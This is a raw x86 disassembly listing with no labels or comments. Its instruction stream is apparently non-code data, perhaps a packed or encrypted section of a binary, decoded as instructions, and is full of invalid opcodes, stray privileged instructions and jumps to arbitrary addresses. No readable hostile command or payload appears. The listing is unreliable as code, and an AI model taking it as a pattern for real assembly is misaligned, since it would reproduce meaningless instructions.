  408fcd:	and    eax,0xa62044a3
  408fd2:	add    al,0xea
  408fd4:	inc    esp
  408fd5:	jl     0x409041
  408fd7:	inc    esp
  408fd8:	xor    eax,0x61895aa3
  408fdd:	mov    edi,0xb047ac9f
  408fe2:	pop    ebx
  408fe3:	inc    edi
  408fe4:	inc    ecx
  408fe5:	pop    ebx
  408fe6:	adc    esi,DWORD PTR [ebp+ebx*8-0x1c]
  408fea:	pusha  
  408feb:	cmp    BYTE PTR [esi+0x1a4330fa],cl
  408ff1:	mov    ds:0x52843132,al
  408ff6:	or     esi,0x4b
  408ff9:	mov    esi,0xa8edd1a
  408ffe:	cmp    eax,0xe342edd
  409003:	add    BYTE PTR [esi-0x64],bl
  409006:	or     BYTE PTR [eax-0xcf915ce],0xb9
  40900d:	in     eax,0x1c
  40900f:	ret    0x9175
  409012:	sbb    eax,0x1a8402ab
  409017:	sub    BYTE PTR [ebx-0x768603e8],ah
  40901d:	and    BYTE PTR [edx+0x1d7dcb7d],0x94
  409024:	mov    eax,ds:0xf2561659
  409029:	call   0x2177:0xdf62104e
  409030:	and    bh,BYTE PTR [esi+0x14]
  409033:	pop    ds
  409034:	mov    eax,ebx
  409036:	adc    dh,dh
  409038:	jns    0x409017
  40903a:	jg     0x408fda
  40903c:	pushf  
  40903d:	jno    0x408ffa
  40903f:	mov    edi,0x9663d992
  409044:	(bad)  
  409045:	sbb    DWORD PTR [esi-0x5212faca],eax
  40904b:	xor    BYTE PTR [ebx-0x5ea8e1d],0x38
  409052:	jbe    0x40908c
  409054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409055:	dec    ecx
  409056:	xchg   ebx,eax
  409057:	int    0x86
  409059:	xor    ch,BYTE PTR [eax+0x392942f1]
  40905f:	add    eax,0x72837572
  409064:	mov    ch,0x8b
  409066:	mov    ebp,0x3cf8ac23
  40906b:	push   cs
  40906c:	add    al,BYTE PTR [eax+ecx*1-0x1493065d]
  409073:	arpl   bx,cx
  409075:	lea    edi,[ebx-0x5a379b24]
  40907b:	retf   0x4a21
  40907e:	jb     0x409084
  409080:	mov    bl,0x79
  409082:	mov    ds:0x9b52f817,eax
  409087:	or     ah,dl
  409089:	jae    0x4090bb
  40908b:	jns    0x4090aa
  40908d:	dec    edx
  40908e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40908f:	adc    ebp,DWORD PTR [edx+0x48]
  409092:	test   DWORD PTR [ebp-0x7411fda7],0x4b9e4fc9
  40909c:	jne    0x4090a9
  40909e:	shl    BYTE PTR [ebx+0x48bb53f3],0x92
  4090a5:	aam    0x84
  4090a7:	jmp    0x97cc:0x9c136559
  4090ae:	ss jg  0x4090c8
  4090b1:	pop    eax
  4090b2:	call   0xb1b4221d
  4090b7:	lds    ebx,FWORD PTR [eax-0x145ae87f]
  4090bd:	or     BYTE PTR [eax-0x54],dh
  4090c0:	hlt    
  4090c1:	(bad)  
  4090c2:	clc    
  4090c3:	xchg   esi,eax
  4090c4:	mov    edi,0x4874f44b
  4090c9:	icebp  
  4090ca:	cmp    al,0x79
  4090cc:	shr    BYTE PTR gs:[edi],0x8a
  4090d0:	pop    ebp
  4090d1:	hlt    
  4090d2:	mov    dl,0x4
  4090d4:	aaa    
  4090d5:	and    DWORD PTR [edx],edx
  4090d7:	pop    ds
  4090d8:	ret    0xc7e9
  4090db:	mov    WORD PTR [ebp+eax*4-0x23],ss
  4090df:	mov    esp,0x16b9bd48
  4090e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e5:	adc    DWORD PTR [edi],esi
  4090e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e8:	ror    DWORD PTR [ebx+0x4a9676cf],0xdf
  4090ef:	mov    ecx,0x6a1a22ad
  4090f4:	fisub  WORD PTR [edx-0x53]
  4090f7:	xchg   DWORD PTR [ebx+esi*1],esp
  4090fa:	mov    esi,0xbf8d79d5
  4090ff:	les    esp,FWORD PTR [edi]
  409101:	cmp    ebx,DWORD PTR [ecx-0x69]
  409104:	dec    ecx
  409105:	jae    0x409095
  409107:	sub    bl,BYTE PTR [ebx-0xa5aa430]
  40910d:	jp     0x4090bf
  40910f:	aaa    
  409110:	or     al,0x24
  409112:	dec    ecx
  409113:	xchg   esi,eax
  409114:	test   eax,0xacaf2b8e
  409119:	dec    ecx
  40911a:	pop    ebx
  40911b:	xor    eax,0xeccfc66d
  409120:	loop   0x4090ce
  409122:	mov    ebp,0xca39ca21
  409127:	rol    bl,0x82
  40912a:	pop    ebp
  40912b:	sub    ebx,0x28523891
  409131:	sti    
  409132:	(bad)  
  409136:	inc    ecx
  409137:	test   eax,0x867a4788
  40913c:	imul   edi,esi,0x7c042d3f
  409142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409144:	jp     0x40918e
  409146:	and    al,0xb7
  409148:	lods   eax,DWORD PTR ds:[esi]
  409149:	jp     0x409182
  40914b:	push   0x446ae8c2
  409150:	mov    esp,0xabb05a8a
  409155:	adc    eax,0x3d7de838
  40915a:	in     al,dx
  40915b:	imul   esi,DWORD PTR [esi+0xa],0xff06c1be
  409162:	mov    al,ds:0xab606154
  409167:	dec    edi
  409168:	sbb    ebp,DWORD PTR [ebx+0x1464d8c3]
  40916e:	aaa    
  40916f:	aas    
  409170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409171:	mov    edx,ebp
  409173:	xor    edi,esi
  409175:	sbb    al,0x72
  409177:	aaa    
  409178:	pushf  
  409179:	sbb    ch,dh
  40917b:	ror    BYTE PTR [eax+0x25b663e4],cl
  409181:	inc    esi
  409182:	mov    eax,ds:0xb2def4d2
  409187:	push   ds
  409188:	add    eax,0x54f2bd60
  40918d:	cwde   
  40918e:	(bad)  
  40918f:	jns    0x4091f7
  409191:	out    dx,eax
  409192:	mov    ss,WORD PTR [eax-0x37]
  409195:	cmp    ecx,esi
  409197:	ror    BYTE PTR [edx+0x3e],0x5a
  40919b:	sbb    ebp,DWORD PTR [esi+edx*8]
  40919e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40919f:	test   DWORD PTR [esi-0x8],edi
  4091a2:	imul   ecx,DWORD PTR [ebp-0x2b6122e6],0xffffffd2
  4091a9:	es pop eax
  4091ab:	aas    
  4091ac:	pop    ds
  4091ad:	les    edi,FWORD PTR [esi]
  4091af:	jns    0x409214
  4091b1:	cmc    
  4091b2:	pusha  
  4091b3:	jno    0x409234
  4091b5:	sahf   
  4091b6:	rcr    edi,cl
  4091b8:	or     eax,ebx
  4091ba:	and    dl,BYTE PTR [eax]
  4091bc:	push   cs
  4091bd:	mov    ch,0x40
  4091bf:	sbb    eax,0x382a6761
  4091c4:	(bad)  
  4091c5:	lea    esi,[edi+0x3f14e9f0]
  4091cb:	pop    esi
  4091cc:	jge    0x40924b
  4091ce:	pop    eax
  4091cf:	add    BYTE PTR [edi+0x50fe9307],bl
  4091d5:	push   0xf48144a
  4091da:	stos   DWORD PTR es:[edi],eax
  4091db:	sub    bh,BYTE PTR [edx-0x5]
  4091de:	pusha  
  4091df:	adc    DWORD PTR [esi+edi*2+0x23],edx
  4091e3:	addr16 lahf 
  4091e5:	sbb    bh,dh
  4091e7:	xor    ebp,ebp
  4091e9:	shr    DWORD PTR [edx],1
  4091eb:	nop
  4091ec:	adc    BYTE PTR [edx],dl
  4091ee:	mov    al,ds:0xe59526df
  4091f3:	ins    BYTE PTR es:[edi],dx
  4091f4:	sub    edi,0xffffff84
  4091f7:	mov    edx,0xb5ec6961
  4091fc:	sbb    DWORD PTR [edi-0xa],0xdd850b16
  409203:	jo     0x409223
  409205:	add    ch,BYTE PTR [ecx+0x6]
  409208:	dec    ebp
  409209:	adc    BYTE PTR [eax+0x4d0709fd],cl
  40920f:	xchg   esi,eax
  409210:	loop   0x4091fd
  409212:	xchg   edi,eax
  409213:	je     0x409287
  409215:	js     0x40921d
  409217:	scas   al,BYTE PTR es:[edi]
  409218:	adc    al,0xbe
  40921a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40921b:	and    eax,0xe44108f8
  409220:	rol    esi,cl
  409222:	sbb    ch,ah
  409224:	sbb    esi,ecx
  409226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409227:	pop    esp
  409228:	fcomp  DWORD PTR [edi+0x3a]
  40922b:	enter  0x8c76,0xba
  40922f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409230:	jmp    0xa82f:0x6b91d38b
  409237:	mov    esi,DWORD PTR [eax+0x38]
  40923a:	xor    al,0x14
  40923c:	loop   0x4092aa
  40923e:	dec    esp
  40923f:	fnstcw WORD PTR [edi+0x33]
  409242:	das    
  409243:	pop    ebp
  409244:	cmp    ebp,DWORD PTR [edx+0x2d2e28ef]
  40924a:	icebp  
  40924b:	or     ecx,ecx
  40924d:	xor    DWORD PTR [eax],0x2a37559b
  409253:	push   ebx
  409254:	jle    0x4092b7
  409256:	inc    esi
  409257:	mov    al,0x98
  409259:	cmc    
  40925a:	jns    0x409217
  40925c:	jle    0x409248
  40925e:	(bad)  
  40925f:	mov    esi,0x3b7cb9fe
  409264:	adc    ebp,DWORD PTR [ebp+0x3b815a9d]
  40926a:	retf   
  40926b:	outs   dx,DWORD PTR ds:[esi]
  40926c:	sub    ah,dh
  40926e:	rol    BYTE PTR [ecx],1
  409270:	popf   
  409271:	mov    esp,0x5c470431
  409276:	xor    al,0xf7
  409278:	jbe    0x409276
  40927a:	push   ebp
  40927b:	mov    BYTE PTR ds:0x598cff62,al
  409281:	sti    
  409282:	mov    bh,0xf6
  409284:	sbb    al,0x1a
  409286:	scas   eax,DWORD PTR es:[edi]
  409287:	add    eax,0x553871aa
  40928d:	out    dx,al
  40928e:	out    dx,eax
  40928f:	fstp   QWORD PTR ds:0xdea6d7a2
  409295:	inc    edi
  409296:	sbb    DWORD PTR [eax],ecx
  409298:	sbb    dl,BYTE PTR [ecx-0x40451bdf]
  40929e:	adc    eax,0x4bf6d276
  4092a3:	or     al,0x3b
  4092a5:	jae    0x4092b8
  4092a7:	out    dx,al
  4092a8:	pop    edx
  4092a9:	sbb    eax,DWORD PTR [eax]
  4092ab:	lahf   
  4092ac:	push   ebx
  4092ad:	add    edi,0xffffffd8
  4092b0:	std    
  4092b1:	js     0x4092b3
  4092b3:	mov    ebp,0xd68ac6cd
  4092b8:	or     DWORD PTR [ecx+0x555b7e91],ebx
  4092be:	pushf  
  4092bf:	xchg   esp,eax
  4092c0:	fsub   DWORD PTR [eax+0x42]
  4092c3:	sub    al,0x3d
  4092c5:	or     esp,edx
  4092c7:	push   0xa0bf303d
  4092cc:	pop    edx
  4092cd:	and    dh,BYTE PTR [edx+0x5c8058ca]
  4092d3:	imul   edx,DWORD PTR [edi-0x3c],0x12
  4092d7:	(bad)  
  4092d8:	and    BYTE PTR [esp+edi*4+0x288b9806],bl
  4092df:	cmc    
  4092e0:	adc    edx,DWORD PTR [esi+0x319e0bae]
  4092e6:	sar    BYTE PTR ss:[edx+0x2],cl
  4092ea:	jg     0x40931c
  4092ec:	mov    eax,ds:0x561e9e3b
  4092f1:	pop    esi
  4092f2:	loope  0x40927a
  4092f4:	dec    esi
  4092f5:	scas   al,BYTE PTR es:[edi]
  4092f6:	test   al,0xbf
  4092f8:	sahf   
  4092f9:	inc    edi
  4092fa:	add    BYTE PTR [edx+0x32],al
  4092fd:	mov    ch,0xc3
  4092ff:	int    0xac
  409301:	cmp    esp,DWORD PTR [edx+0x55]
  409304:	ins    DWORD PTR es:[edi],dx
  409305:	sahf   
  409306:	add    eax,0x65bff3dd
  40930b:	scas   eax,DWORD PTR es:[edi]
  40930c:	jmp    0xd870:0xf4d8dd8b
  409313:	sub    BYTE PTR [esi+0x1c057ac8],ch
  409319:	xchg   edx,eax
  40931a:	aad    0xfb
  40931c:	mov    ecx,0xd0bd7a3f
  409321:	icebp  
  409322:	mov    ebp,0xe1d8cc
  409327:	ss loop 0x409310
  40932a:	test   al,0x38
  40932c:	sbb    DWORD PTR [edx-0x56],0xffffffc5
  409330:	or     DWORD PTR [edi],esp
  409332:	ins    BYTE PTR es:[edi],dx
  409333:	cli    
  409334:	mov    ah,ch
  409336:	fwait
  409337:	retf   0xc986
  40933a:	inc    ebp
  40933b:	pushf  
  40933c:	mov    DWORD PTR ds:0xdd2bb012,ecx
  409342:	call   0xf4678194
  409347:	jo     0x409320
  409349:	enter  0xced2,0xba
  40934d:	xchg   esp,eax
  40934e:	popa   
  40934f:	sub    al,0xb6
  409351:	gs push ecx
  409353:	hlt    
  409354:	ret    0x460d
  409357:	in     eax,dx
  409358:	xchg   esp,eax
  409359:	push   cs
  40935a:	and    BYTE PTR [ebx-0x6217e06f],0x79
  409361:	sub    al,dh
  409363:	mov    BYTE PTR [ebx-0x6a],bh
  409366:	cwde   
  409367:	cwde   
  409368:	mov    edi,0xd72dbe1f
  40936d:	loop   0x4093dc
  40936f:	adc    BYTE PTR [ecx-0x701f5dc6],al
  409375:	xchg   esi,eax
  409376:	rcl    DWORD PTR [ebx-0x271de008],1
  40937c:	imul   ecx,DWORD PTR [esi+0x12956197],0x5490e9bd
  409386:	es hlt 
  409388:	dec    eax
  409389:	jmp    0x7b7f:0x35abbe56
  409390:	push   es
  409391:	(bad)  
  409392:	dec    edi
  409393:	cmp    DWORD PTR ds:0x66cc487f,ebp
  409399:	pop    ebx
  40939a:	mov    dh,0x9
  40939c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40939d:	bound  edx,QWORD PTR [ecx]
  40939f:	mov    ecx,0x5d3a2a07
  4093a4:	loope  0x4093ab
  4093a6:	mov    cl,BYTE PTR [ecx+0x338f0b42]
  4093ac:	enter  0x599,0xaa
  4093b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093b1:	mov    bh,0xd5
  4093b3:	enter  0xf9e3,0x9f
  4093b7:	mov    ebx,0xf164191d
  4093bc:	adc    BYTE PTR [edx],bh
  4093be:	ret    
  4093bf:	aas    
  4093c0:	leave  
  4093c1:	mov    cl,0x0
  4093c3:	mov    cs,WORD PTR [ebp+0x66]
  4093c6:	test   BYTE PTR [ebx-0x157be577],ch
  4093cc:	ja     0x409366
  4093ce:	pop    edx
  4093cf:	dec    edi
  4093d0:	inc    ebx
  4093d1:	cdq    
  4093d2:	mov    al,0x9c
  4093d4:	push   ecx
  4093d5:	push   eax
  4093d6:	aaa    
  4093d7:	lock adc eax,DWORD PTR [ebx-0x9]
  4093db:	shl    dl,0x29
  4093de:	scas   eax,DWORD PTR es:[edi]
  4093df:	out    dx,al
  4093e0:	test   eax,0xc513bbe9
  4093e5:	ins    DWORD PTR es:[edi],dx
  4093e6:	call   FWORD PTR [eax+0x1e]
  4093e9:	xor    esp,ebx
  4093eb:	xor    BYTE PTR [eax+0x36],bh
  4093ee:	jmp    0xef179053
  4093f3:	mov    ah,0x60
  4093f5:	(bad)  
  4093f6:	ds xchg edi,eax
  4093f8:	cmp    DWORD PTR [edi],ecx
  4093fa:	aam    0x78
  4093fc:	jmp    0x921ea890
  409401:	cwde   
  409402:	xor    DWORD PTR [ebx+0x7ac985df],eax
  409408:	aam    0xa5
  40940a:	mov    cl,0xb0
  40940c:	pop    ds
  40940d:	(bad)  
  40940e:	dec    edx
  40940f:	(bad)
  409412:	adc    eax,0xb21a475d
  409417:	cld    
  409418:	iret   
  409419:	xchg   ebx,eax
  40941a:	imul   esi,eax,0xffffffe8
  40941d:	pusha  
  40941e:	jmp    0x63400ec4
  409423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409424:	mov    ds,ebp
  409426:	js     0x409403
  409428:	icebp  
  409429:	sbb    bh,BYTE PTR ds:0x3a46b5c4
  40942f:	mov    esp,0x452d53ab
  409434:	icebp  
  409435:	dec    ebp
  409436:	daa    
  409437:	dec    eax
  409438:	cdq    
  409439:	bound  eax,QWORD PTR [edx-0x638abc56]
  40943f:	pop    ds
  409440:	mov    al,ds:0x6d08dc00
  409445:	enter  0xe3c3,0x84
  409449:	inc    ecx
  40944a:	scas   al,BYTE PTR es:[edi]
  40944b:	adc    eax,0x42266fd0
  409450:	xor    eax,DWORD PTR [edi-0x37]
  409453:	shl    BYTE PTR [edi],0xed
  409456:	mov    esp,0x193a72d9
  40945b:	dec    edx
  40945c:	pop    edx
  40945d:	pop    ds
  40945e:	sbb    al,0xb0
  409460:	pop    edi
  409461:	push   edx
  409462:	pop    edx
  409463:	int3   
  409464:	jb     0x40949a
  409466:	fnsave [ebx+ecx*2]
  409469:	hlt    
  40946a:	push   0xf9f6173a
  40946f:	cmp    dh,0x59
  409472:	and    ecx,DWORD PTR [ebx-0x13]
  409475:	mov    edi,0xd254f992
  40947a:	push   0xfffffff9
  40947c:	sbb    DWORD PTR [ebx],0xffffff89
  40947f:	aad    0xd8
  409481:	jle    0x409416
  409483:	mov    ds:0xa337662,al
  409488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409489:	clc    
  40948a:	fnstcw WORD PTR [esi+edx*8-0x5a]
  40948e:	mov    esi,0xcdf5e63f
  409493:	mov    ebx,ecx
  409495:	adc    al,0xc5
  409497:	in     al,dx
  409498:	mov    ebp,0x2470a4e
  40949d:	push   0x163c3804
  4094a2:	inc    ebp
  4094a3:	imul   ecx,DWORD PTR [edi-0x6c6c8415],0x7b
  4094aa:	rcr    DWORD PTR [ebx],cl
  4094ac:	rcl    BYTE PTR [ebx+0x3],1
  4094af:	xchg   BYTE PTR [edx],al
  4094b1:	es stc 
  4094b3:	xchg   BYTE PTR [edx+0x25],bl
  4094b6:	xchg   esp,eax
  4094b7:	sub    al,0xb7
  4094b9:	in     al,dx
  4094ba:	fdivr  st,st(1)
  4094bc:	ror    BYTE PTR [ecx],cl
  4094be:	cld    
  4094bf:	outs   dx,DWORD PTR ds:[esi]
  4094c0:	inc    esi
  4094c1:	ja     0x409488
  4094c3:	fcmovne st,st(6)
  4094c5:	jbe    0x409522
  4094c7:	outs   dx,DWORD PTR ds:[esi]
  4094c8:	mov    cl,0x4e
  4094ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094cb:	jmp    0x55511568
  4094d0:	pop    ss
  4094d1:	(bad)  
  4094d2:	cmp    al,0xee
  4094d4:	xchg   ebp,eax
  4094d5:	test   al,0x17
  4094d7:	scas   al,BYTE PTR es:[edi]
  4094d8:	ss add esp,ecx
  4094db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094dc:	outs   dx,BYTE PTR ds:[esi]
  4094dd:	adc    al,0x73
  4094df:	mov    ds:0x81023cc6,eax
  4094e4:	xlat   BYTE PTR ds:[ebx]
  4094e5:	adc    DWORD PTR [eax],ebp
  4094e7:	rcr    DWORD PTR [ecx-0x72a2a616],1
  4094ed:	sub    al,0x37
  4094ef:	leave  
  4094f0:	push   0xacfeece2
  4094f5:	push   ebp
  4094f6:	(bad)  
  4094f7:	in     eax,dx
  4094f8:	mov    cl,0x55
  4094fa:	xchg   ebx,eax
  4094fb:	in     al,dx
  4094fc:	fwait
  4094fd:	sbb    DWORD PTR [esp+ebx*1+0xa5e1844],ecx
  409504:	xor    al,0xab
  409506:	mov    ax,ds:0x32cfc306
  40950c:	je     0x4094ac
  40950e:	xor    edi,ebx
  409510:	rcr    DWORD PTR [edx-0x6826e693],cl
  409516:	sbb    BYTE PTR [eax-0x41bde632],cl
  40951c:	adc    DWORD PTR [edi+0x73],0xffffffb5
  409520:	sahf   
  409521:	inc    edi
  409522:	shl    DWORD PTR [edi],1
  409524:	mov    esp,DWORD PTR [eax+0x51f5f096]
  40952a:	push   edx
  40952b:	js     0x4094fe
  40952d:	mov    DWORD PTR [esi-0x4c29631e],ebp
  409533:	mov    eax,ds:0x6a5cdf3e
  409538:	les    esi,FWORD PTR [ecx]
  40953a:	aas    
  40953b:	pop    eax
  40953c:	inc    ebx
  40953d:	pop    eax
  40953e:	inc    edi
  40953f:	sbb    eax,0x6d6d33ce
  409544:	pop    ss
  409545:	cld    
  409546:	enter  0x1320,0xc9
  40954a:	lea    esp,[edx]
  40954c:	sub    al,0xba
  40954e:	bound  ebx,QWORD PTR [esi-0x546991aa]
  409554:	mov    BYTE PTR [ecx+0x56],ch
  409557:	inc    ebx
  409558:	scas   al,BYTE PTR es:[edi]
  409559:	jle    0x4095c0
  40955b:	in     eax,0x39
  40955d:	mov    ebp,0x70680f7b
  409562:	std    
  409563:	aas    
  409564:	jp     0x409549
  409566:	aad    0x7e
  409568:	xchg   edx,eax
  409569:	xor    DWORD PTR [ebx+0x6fbc07d9],ecx
  40956f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409570:	cmp    DWORD PTR [eax],0x26cb4578
  409576:	inc    esi
  409577:	and    DWORD PTR [esi+0xf],ebp
  40957a:	pushf  
  40957b:	aas    
  40957c:	or     eax,0x20360bbc
  409581:	mov    bl,0x77
  409583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409584:	(bad)  
  409585:	jle    0x4095e0
  409587:	and    al,0xf5
  409589:	pop    ebx
  40958a:	mul    BYTE PTR [edx+0x42]
  40958d:	or     esp,DWORD PTR [bp+di]
  409590:	jne    0x4095cd
  409592:	mov    ?,WORD PTR [ebx]
  409594:	sbb    BYTE PTR [edx+0x35a03e04],al
  40959a:	push   cs
  40959b:	addr16 jl 0x409610
  40959e:	cmp    DWORD PTR [ebp+0x59],ecx
  4095a1:	and    dl,BYTE PTR [edi-0x62]
  4095a4:	dec    ebx
  4095a5:	fcomp  DWORD PTR [esi+0x4c4d9e67]
  4095ab:	cmp    BYTE PTR [edi+ebp*1],ch
  4095ae:	xchg   esp,eax
  4095af:	cdq    
  4095b0:	rol    BYTE PTR [esi-0x11],cl
  4095b3:	sub    BYTE PTR [ebx-0xb17e081],cl
  4095b9:	fadd   QWORD PTR [ebx-0x1a]
  4095bc:	dec    ebx
  4095bd:	adc    BYTE PTR [ecx],dl
  4095bf:	sub    dh,BYTE PTR [ecx]
  4095c1:	dec    esi
  4095c2:	and    edi,DWORD PTR [ebp+0x16]
  4095c5:	ss lods al,BYTE PTR fs:[esi]
  4095c8:	sub    BYTE PTR [edi+0x59ec1bc5],dl
  4095ce:	or     al,0x82
  4095d0:	ins    BYTE PTR es:[edi],dx
  4095d1:	repz dec eax
  4095d3:	inc    ebp
  4095d4:	push   edi
  4095d5:	inc    ebx
  4095d6:	add    esp,ecx
  4095d8:	jno    0x4095f5
  4095da:	(bad)
  4095dd:	retf   
  4095de:	adc    dl,bh
  4095e0:	retf   
  4095e1:	ret    
  4095e2:	jae    0x409651
  4095e4:	loop   0x4095e1
  4095e6:	dec    esp
  4095e7:	jl     0x4095d7
  4095e9:	jmp    0x409604
  4095eb:	cmp    bh,BYTE PTR [ebp-0x3b6b9f21]
  4095f1:	sar    DWORD PTR [ebp+0x35],cl
  4095f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095f5:	daa    
  4095f6:	pop    bp
  4095f8:	pop    es
  4095f9:	mov    ds:0x290e3e83,al
  4095fe:	inc    ebx
  4095ff:	jg     0x409678
  409601:	mov    ah,0x8a
  409603:	push   es
  409604:	mov    ch,bl
  409606:	xchg   esp,eax
  409607:	nop
  409608:	sete   BYTE PTR [eax*4-0x2fc38e49]
  409610:	cld    
  409611:	and    DWORD PTR [ebp-0x54],eax
  409614:	lea    ebx,[ebp+0x1f]
  409617:	shr    DWORD PTR [eax+0x4f78b916],1
  40961d:	push   ecx
  40961e:	push   esp
  40961f:	inc    ebp
  409620:	jle    0x40962c
  409622:	iret   
  409623:	imul   ebp,DWORD PTR [ebx-0x75],0x1bae68ed
  40962a:	lea    edx,[eax]
  40962c:	lods   eax,DWORD PTR ds:[esi]
  40962d:	(bad)  
  40962e:	sar    DWORD PTR [edx+edx*2-0x45],1
  409632:	dec    esp
  409633:	and    BYTE PTR [ecx+0x597bab86],0xf0
  40963a:	test   al,0x62
  40963c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40963d:	xchg   edi,eax
  40963e:	push   eax
  40963f:	arpl   WORD PTR [esi-0x45c1fa22],cx
  409645:	cli    
  409646:	clc    
  409647:	xor    al,0x20
  409649:	or     ecx,DWORD PTR [edx]
  40964b:	mov    edx,0xf3c9bdef
  409650:	std    
  409651:	loop   0x4095ef
  409653:	addr16 inc ecx
  409655:	xor    cl,dh
  409657:	push   ebx
  409658:	int3   
  409659:	dec    ebp
  40965a:	icebp  
  40965b:	arpl   WORD PTR ds:[edx+0x77],cx
  40965f:	xor    eax,0x58647ba8
  409664:	mov    BYTE PTR [esi-0xe],bl
  409667:	xor    eax,0xf52b8758
  40966c:	xchg   edx,eax
  40966d:	mov    ebx,0x376462e8
  409672:	xchg   ebx,eax
  409673:	pop    edi
  409674:	leave  
  409675:	fs dec esi
  409677:	dec    esi
  409678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409679:	sub    dh,dl
  40967b:	jmp    0x4096b6
  40967d:	fiadd  WORD PTR [edi]
  40967f:	xchg   edx,eax
  409680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409681:	jns    0x409686
  409683:	pop    DWORD PTR [eax]
  409685:	xchg   ecx,eax
  409686:	push   ds
  409687:	fidivr DWORD PTR [esi+0x37]
  40968a:	(bad)  
  40968b:	popf   
  40968c:	(bad)  
  40968d:	icebp  
  40968e:	into   
  40968f:	aaa    
  409690:	test   ebp,0xef5d78f7
  409696:	scas   eax,DWORD PTR es:[edi]
  409697:	sub    bl,BYTE PTR [eax-0x5d07e53f]
  40969d:	adc    bh,BYTE PTR [edx]
  40969f:	retf   
  4096a0:	mov    esi,0x5ab3674a
  4096a5:	pop    esi
  4096a6:	ficom  DWORD PTR [eax]
  4096a8:	or     eax,DWORD PTR [edi-0x25bdbd54]
  4096ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096af:	xchg   esp,eax
  4096b0:	data16 std 
  4096b2:	daa    
  4096b3:	fnsave [esi+0x4aa8d0a5]
  4096b9:	imul   ebx,DWORD PTR [ebx],0xffffffe8
  4096bc:	jmp    0x409686
  4096be:	(bad)  [ebp+0xa8bbb90]
  4096c4:	lahf   
  4096c5:	ror    edi,1
  4096c7:	test   DWORD PTR [edx],ecx
  4096c9:	add    al,0xc4
  4096cb:	push   eax
  4096cc:	lods   al,BYTE PTR ds:[esi]
  4096cd:	mov    DWORD PTR [eax],esi
  4096cf:	shl    DWORD PTR [esi],1
  4096d1:	ins    BYTE PTR es:[edi],dx
  4096d2:	push   cs
  4096d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d4:	push   ds
  4096d5:	(bad)  
  4096d6:	scas   al,BYTE PTR es:[edi]
  4096d7:	enter  0xe11f,0xa3
  4096db:	cmc    
  4096dc:	aaa    
  4096dd:	and    cl,BYTE PTR [eax+0x187688bd]
  4096e3:	or     al,0x4a
  4096e5:	fist   WORD PTR [edi-0x56]
  4096e8:	in     al,0x24
  4096ea:	sbb    ecx,DWORD PTR [ecx-0x13]
  4096ed:	ficomp DWORD PTR [ebx-0x3]
  4096f0:	adc    BYTE PTR [eax+0x3a],dl
  4096f3:	pushf  
  4096f4:	pop    ebp
  4096f5:	dec    ebx
  4096f6:	(bad)  
  4096f8:	outs   dx,DWORD PTR ds:[esi]
  4096f9:	nop
  4096fa:	jo     0x4096e6
  4096fc:	mov    edx,0xb8d04ce3
  409701:	sbb    al,0x9f
  409703:	imul   edi,DWORD PTR [ecx-0x79],0xffffffc8
  409707:	push   ds
  409708:	ja     0x409746
  40970a:	aam    0x16
  40970c:	jns    0x4096fc
  40970e:	or     eax,0x2b02d5b5
  409713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409714:	adc    ah,ah
  409716:	lock or BYTE PTR [edx-0x3fa38de9],cl
  40971d:	adc    BYTE PTR [esi],al
  40971f:	ficomp DWORD PTR [edi]
  409721:	jns    0x40978e
  409723:	push   0xab9db520
  409728:	sbb    al,0xa4
  40972a:	pop    esp
  40972b:	push   eax
  40972c:	jl     0x40971a
  40972e:	lods   eax,DWORD PTR ds:[esi]
  40972f:	xchg   esi,eax
  409730:	scas   al,BYTE PTR es:[edi]
  409731:	fucom  st(0)
  409733:	xchg   esp,eax
  409734:	jmp    0x40970b
  409736:	push   es
  409737:	adc    dh,BYTE PTR [eax-0xe1a7ff3]
  40973d:	fcmovne st,st(0)
  40973f:	jl     0x40972b
  409741:	inc    ecx
  409742:	fadd   st,st(0)
  409744:	mov    esp,0xb6b514cf
  409749:	and    BYTE PTR [edx-0x76],bh
  40974c:	pop    esp
  40974d:	jg     0x409758
  40974f:	fistp  DWORD PTR [ecx]
  409751:	sbb    BYTE PTR [eax+edx*1-0x617fa9ac],bl
  409758:	mov    ebx,0xaef5ce97
  40975d:	sar    BYTE PTR [ebp+0x63ca5fa5],cl
  409763:	sub    DWORD PTR [esi-0x39419036],esp
  409769:	pop    ss
  40976a:	in     al,dx
  40976b:	and    dl,cl
  40976d:	jae    0x40970e
  40976f:	dec    edi
  409770:	sub    ebx,DWORD PTR [bx+0x21]
  409774:	pop    eax
  409775:	cmp    DWORD PTR [ebp-0x7f884265],esi
  40977b:	jbe    0x4097c9
  40977d:	mov    al,ds:0x5350cd0d
  409782:	(bad)  
  409783:	sar    BYTE PTR [edi],cl
  409785:	xchg   ebp,eax
  409786:	add    ecx,ebx
  409788:	inc    ebx
  409789:	arpl   WORD PTR [edx-0x60],dx
  40978c:	(bad)  
  40978d:	js     0x40975f
  40978f:	clc    
  409790:	mov    BYTE PTR [ebp+0x24],ch
